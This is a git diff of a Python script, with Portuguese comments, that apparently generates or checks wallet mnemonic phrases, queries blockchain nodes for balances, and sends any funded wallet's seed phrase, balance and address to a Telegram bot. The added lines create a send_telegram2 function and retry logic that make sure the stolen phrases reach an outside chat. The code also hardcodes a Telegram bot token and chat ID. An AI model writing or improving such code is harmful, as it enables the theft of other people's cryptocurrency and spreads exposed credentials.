@@ -29,6 +29,18 @@ pos01=var1;pos02=config.pos02;pos03=config.pos03;pos04=config.pos04;pos05=config
 w3 = Web3()
 w3.eth.account.enable_unaudited_hdwallet_features()
 
+wallet=""
+
+# ENVIA QUANDO ATINGE 10M
+def send_telegram2(mnemonic,balance,wallet):
+    # print(f"count: "+str(count)+" - "+str(mnemonic))
+    payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(balance)+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
+    r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)  
+    if r.ok:
+        pass
+    else:
+        send_telegram2(mnemonic,balance,wallet)
+
 def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
     #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
     #print(str(wallet))
@@ -59,6 +71,10 @@ def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
             #print(f"count: "+str('%018.0f' % total_wallet)+"/"+str('%018.0f' % count)+" - time: "+str("{:6.4f}".format(total))+" - "+str(w)+" | "+str(balance)+" | "+str(mnemonic)+" - "+str(valida_palavras_validadores.bsc[int(rand)]))     
             payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(web3.from_wei(balance,'ether'))+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
             r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    
+            if r.ok:
+                pass
+            else:
+                send_telegram2(mnemonic,balance,wallet)            
             #arquivo = open("wallet_"+str(id)+".txt", "a")
             #arquivo.write(str(p1)+" "+str(p2)+" "+str(p3)+" "+str(p4)+" "+str(p5)+" "+str(p6)+" "+str(p7)+" "+str(p8)+" "+str(p9)+" "+str(p10)+" "+str(p11)+" "+str(p12)+"\n")                                    
     
